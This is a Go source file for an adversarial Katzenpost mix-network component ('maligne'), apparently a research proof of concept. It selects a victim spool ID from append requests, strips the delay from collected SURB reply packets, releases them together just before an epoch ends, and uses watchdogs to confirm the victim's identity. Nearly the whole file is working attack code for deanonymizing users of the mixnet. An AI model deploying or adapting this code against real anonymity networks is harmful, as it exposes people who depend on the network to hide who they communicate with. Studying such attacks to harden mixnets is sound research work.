// maligne.go - Katzenposts adversary .
// Copyright (C) 2023 Maximlian Weisenseel
// Inspired by the scheduler code
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as
// published by the Free Software Foundation, either version 3 of the
// License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package maligne

import (
	"bytes"
	"sync"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/katzenpost/katzenpost/core/epochtime"
	"github.com/katzenpost/katzenpost/core/worker"
	"github.com/katzenpost/katzenpost/memspool/common"
	"github.com/katzenpost/katzenpost/server/cborplugin"
	"github.com/katzenpost/katzenpost/server/internal/glue"
	"github.com/katzenpost/katzenpost/server/internal/packet"
	"gopkg.in/eapache/channels.v1"
	"gopkg.in/op/go-logging.v1"
)

/* Number of Packets required to execute this attack
 * the idea is that releasing a lot of "wrong" surbs
 * at a specific moment could reveal something fishy
 * is going on, and *could* defenitly noticed by the
 * target provider, so we want to execute the attack
 * only when we the success chances are high enough
 */
const ATTACK_THRESHHOLD = 5

/* Defines the moment the attack should be executed,
 * we could also define this only over the
 * ATTACK_TRESHHOLD, but more packets will increase
 * the chances, we ATTACK_TIMER is the amount of
 * seconds left till the next epoch is started
 * and the collected SURBs become invalid.
 * *MAYBE* this can even get 0, since there
 * is a grace period, but lets try
 */
const ATTACK_TIMER = 5 * time.Second

type queueImpl interface {
	Halt()
	Peek() (time.Duration, *packet.Packet)
	Pop()
	BulkEnqueue([]*packet.Packet)
}

type maligne struct {
	worker.Worker

	glue   glue.Glue
	log    *logging.Logger
	victim [common.SpoolIDSize]byte

	inCh            *channels.InfiniteChannel
	resultCh        chan []byte
	outCh           *channels.BatchingChannel
	epochEndCh      chan uint64
	queue           []*packet.Packet
	mischiefManaged bool
	mapMutex        sync.Mutex
	watchDogMap     map[string]*watchDog
}

func (mal *maligne) Halt() {
	mal.Worker.Halt()
	mal.inCh.Close()
}

func (mal *maligne) OnNewMixMaxDelay(newEpochEnd uint64) {
	mal.epochEndCh <- newEpochEnd
}

func (mal *maligne) OnPacket(pkt *packet.Packet) {
	mal.inCh.In() <- pkt
}

func calculate_timer() time.Duration {
	_, _, till := epochtime.Now()
	if till > (ATTACK_TIMER)+1*time.Second {
		return till - ATTACK_TIMER
	} else {
		return till + 10*time.Second
	}

}
func timer_fired() bool {
	_, _, till := epochtime.Now()
	return till <= ATTACK_TIMER
}

func (mal *maligne) worker() {
	var timer *time.Timer
	timer = time.NewTimer(calculate_timer())
	defer timer.Stop()

	for {
		// The vast majority of the time the scheduler will be idle waiting on
		// new packets or for a packet in the priority queue to be eligible
		// for dispatch.  This is where the actual "mix" part of the mix
		// network happens.
		//
		// There's only a single go routine responsible for packet scheduling
		// under the assumption that this isn't CPU intensive in the slightest,
		// and that the main performance gains come from parallelizing the
		// crypto, and being clever about congestion management.
		select {
		case <-mal.HaltCh():
			// Th-th-th-that's all folks.
			mal.log.Debugf("Terminating gracefully.")
			return
		case <-timer.C:
			if timer_fired() {
				mal.log.Debugf("Timer has fired!")
				if len(mal.queue) > ATTACK_THRESHHOLD {
					mal.log.Debugf("Attack Threshold reached! Collected %d packets", len(mal.queue))
					for _, pkt := range mal.queue {
						mal.log.Debugf("Sending Pkt: %v", pkt.ID)
						mal.glue.Scheduler().OnPacket(pkt)
					}
					mal.log.Debugf("Mischief Managed")
					mal.mischiefManaged = true
				} else {
					mal.log.Debugf("Attack Threshold was not reached! Collected only %d of needed %d packets", len(mal.queue), ATTACK_THRESHHOLD)
					mal.log.Debug("Empty the Queue")
					mal.queue = []*packet.Packet{}
				}
			}
		case e := <-mal.inCh.Out():
			pkt := e.(*packet.Packet)
			pkt.Delay = 0
			mal.queue = append(mal.queue, pkt)
			mal.log.Debugf("Delaying pkt: %v", pkt.ID)
		case recipient := <-mal.resultCh:
			mal.log.Debugf("Attack was successful, victim is: %v", recipient)
			mal.log.Debugf("Mischief Managed")
			mal.mischiefManaged = true
		}
		timer = time.NewTimer(calculate_timer())

		if mal.mischiefManaged {
			for _, wd := range mal.watchDogMap {
				wd.Worker.Halt()
			}
			return
		}

	}

	// NOTREACHED
}

// New constructs a new scheduler instance.
func New(glue glue.Glue) (glue.Maligne, error) {

	mal := &maligne{
		glue:       glue,
		log:        glue.LogBackend().GetLogger("maligne"),
		inCh:       channels.NewInfiniteChannel(),
		resultCh:   make(chan []byte),
		epochEndCh: make(chan uint64),
		/* A more advanced version would keep one queue for each victim
		and release them at different points in time, but this is
		fine for a PoC
		*/
		queue:       []*packet.Packet{},
		watchDogMap: make(map[string]*watchDog),
	}

	if epochtime.Period < ATTACK_TIMER {
		mal.log.Debug("Can not Attack, with this Timer. Period is : %v and Attack timer is : %v", epochtime.Period, ATTACK_TIMER)
	}
	mal.victim = [common.SpoolIDSize]byte{}
	mal.mischiefManaged = false
	mal.Go(mal.worker)
	return mal, nil
}

func (mal *maligne) MakeVictim() {
	/*
		 if allZero(mal.victim) {
					mal.log.Debug("no victim selected yet")
					spoolhash := sha512.Sum512_256(request.PublicKey)
					copy(mal.victim[:], spoolhash[:common.SpoolIDSize])
					mal.log.Debugf("New victim selected: %v", mal.victim)
				}
	*/
}
func allZero(s [12]byte) bool {
	for _, v := range s {
		if v != 0 {
			return false
		}
	}
	return true
}

// OnCommand processes a SpoolRequest and returns a SpoolResponse
func (mal *maligne) IsVictim(r cborplugin.Request) bool {
	// the padding bytes were not stripped because
	// without parsing the start of Payload we wont
	// know how long it is, so we will use a streaming
	// decoder and simply return the first cbor object
	// and then discard the decoder and buffer

	//Return to normal operation after executing the attack
	if mal.mischiefManaged {
		return false
	}
	request := &common.SpoolRequest{}
	dec := cbor.NewDecoder(bytes.NewReader(r.Payload))
	err := dec.Decode(request)
	if err != nil {
		return false
	}

	spoolID := [common.SpoolIDSize]byte{}
	copy(spoolID[:], request.SpoolID[:])
	switch request.Command {

	case common.AppendMessageCommand:
		if allZero(mal.victim) {
			copy(mal.victim[:], spoolID[:common.SpoolIDSize])
			mal.log.Debugf("New victim selected: %v", mal.victim)
		}
		if spoolID == mal.victim {
			mal.log.Debugf("Witnessed victim: %d", request.SpoolID)
			return true
		}
	default:
		return false
	}
	// NOT Reached
	return false
}

func (mal *maligne) OnSURBReply(recipient []byte, surbID *[16]byte) {
	mal.mapMutex.Lock()
	defer mal.mapMutex.Unlock()
	wd, ok := mal.watchDogMap[string(recipient)]

	if ok {
		wd.InCh <- *surbID
	} else {
		wd, err := NewWatchDog(mal.glue, mal.resultCh, recipient)
		mal.log.Debugf("Creating new worker for surb %v for %v", surbID, recipient)
		if err != nil {
			mal.log.Errorf("Error while allocationg Watchdog for recipient %v surb %v", recipient, surbID)
			return
		}
		mal.watchDogMap[string(recipient)] = wd
		wd.InCh <- *surbID
		go wd.Go(wd.worker)
	}
}
